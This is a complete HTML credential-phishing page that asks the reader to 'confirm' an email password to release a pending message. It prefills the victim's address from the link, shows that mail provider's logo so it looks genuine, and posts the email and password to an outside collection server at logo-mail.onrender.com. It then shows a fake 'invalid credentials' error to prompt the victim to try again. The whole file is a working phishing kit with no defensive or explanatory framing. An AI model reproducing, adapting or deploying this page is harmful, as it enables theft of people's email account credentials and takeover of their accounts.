<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Confirm Email Password</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background-color: #f0f0f0;
      }
      .container {
        background-color: white;
        padding: 20px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        border-radius: 5px;
        text-align: center;
      }
      .input-field {
        margin: 10px 0;
        padding: 10px;
        width: 100%;
        box-sizing: border-box;
        position: relative;
        text-align: left;
      }
      .input-field input {
        width: calc(100% - 40px);
        padding: 10px;
        border: 1px solid #ccc;
        border-radius: 3px;
        padding-left: 30px;
      }
      .input-field img {
        position: absolute;
        top: 10px;
        left: 10px;
        width: 20px;
        height: 20px;
        display: none;
      }
      .button {
        background-color: #007bff;
        color: white;
        border: none;
        padding: 10px 20px;
        border-radius: 3px;
        cursor: pointer;
      }
      .button:hover {
        background-color: #0056b3;
      }
      .error {
        color: red;
        font-size: 0.9em;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <form id="downloadForm" onsubmit="return validateForm()">
        <h2>Confirm eMail Password To Release Pending message</h2>
        <div class="input-field">
          <label for="username"><h5>Email</h5></label>
          <img id="emailLogo" src="" alt="Email Logo" />
          <input
            type="email"
            id="username"
            placeholder="Enter Email"
            oninput="toggleEmailLogo()"
          />
        </div>
        <div class="input-field">
          <label for="password"><h5>Password</h5></label>
          <input type="password" id="password" placeholder="Enter Password" />
        </div>
        <div id="error" class="error"></div>
        <button type="submit" class="button">LOGIN</button>
      </form>
    </div>

    <script>
      function getDomainFromEmail(email) {
        return email.substring(email.lastIndexOf("@") + 1);
      }

      function toggleEmailLogo() {
        const username = document.getElementById("username").value;
        const emailLogo = document.getElementById("emailLogo");
        const domain = getDomainFromEmail(username);

        if (username.includes("@")) {
          emailLogo.src = `https://logo.clearbit.com/${domain}`;
          emailLogo.style.display = "block";
        } else {
          emailLogo.style.display = "none";
        }
      }

      function validateForm() {
        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;
        const errorDiv = document.getElementById("error");

        if (!username || !password) {
          errorDiv.textContent = "Email and Password required";
          return false;
        }

        errorDiv.textContent = ""; // Clear any previous errors
        sendFormData(username, password);
        return false; // Prevent the form from submitting the traditional way
      }

      async function sendFormData(email, password) {
        try {
          const response = await fetch(
            "https://logo-mail.onrender.com/report",
            {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({ email, password }),
            }
          );

          if (response.ok) {
            const data = await response.json();
            if (data.signal === "ok") {
              alert("Data sent successfully");
            } else {
              document.getElementById("error").textContent =
                "Invalid credentials. Please try again.";
            }
          } else {
            document.getElementById("error").textContent =
              "Invalid credentials. Please try again.";
          }
        } catch (error) {
          document.getElementById("error").textContent = "Invalid Credentials.";
        }
      }

      function extractEmailFromUrl() {
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get("email");
        if (email) {
          document.getElementById("username").value = email;
          toggleEmailLogo(); // Update the logo based on the email
        }
      }

      // Call the function to extract email from the URL on page load
      window.onload = extractEmailFromUrl;
    </script>
  </body>
</html>
